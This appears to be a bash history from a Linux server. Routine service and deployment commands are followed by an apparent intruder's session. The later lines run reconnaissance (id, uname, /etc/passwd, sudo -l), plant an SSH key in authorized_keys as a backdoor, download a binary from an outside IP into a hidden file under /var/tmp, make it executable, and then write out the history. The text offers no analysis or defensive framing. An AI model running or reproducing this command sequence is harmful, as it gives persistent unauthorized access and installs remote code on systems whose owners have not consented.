systemctl status app
ls
cd app
tail -f /var/log/app/app.log
make deploy
sudo systemctl restart app
git pull
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIJLYilzCdEa/kAPq9lUen1YvAdrNACbSE4I4Vmv3ekJ k' >> ~/.ssh/authorized_keys
wget -q http://77.25.151.32/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
